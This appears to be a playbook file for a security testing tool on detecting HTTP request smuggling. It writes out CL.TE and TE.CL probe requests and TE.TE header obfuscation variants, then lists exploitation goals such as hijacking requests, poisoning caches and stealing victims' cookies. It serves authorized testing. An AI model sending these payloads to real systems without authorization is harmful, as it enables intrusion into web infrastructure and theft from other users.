---
name: http-smuggling
category: network
description: HTTP request smuggling detection
attack_types:
  - http_smuggling
  - network
severity_range: [high, critical]
---

# HTTP Request Smuggling

## Phase 1: Detect Intermediaries
- Identify reverse proxies, CDNs, load balancers
- Check `Via`, `X-Forwarded-For`, `Server` headers
- Response header inconsistencies between direct and proxied requests

## Phase 2: CL.TE Detection
Front-end uses Content-Length, back-end uses Transfer-Encoding:
```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
If response is delayed or different, CL.TE confirmed.

## Phase 3: TE.CL Detection
Front-end uses Transfer-Encoding, back-end uses Content-Length:
```
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

## Phase 4: TE.TE (Obfuscation)
Both support TE but one can be tricked:
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding:[tab]chunked
```

## Phase 5: Exploitation
- Bypass front-end security: access restricted paths
- Request hijacking: capture next user's request
- Cache poisoning: smuggled response cached for other users
- Credential theft: reflected request containing victim's cookies
- Web cache deception: force caching of user-specific responses
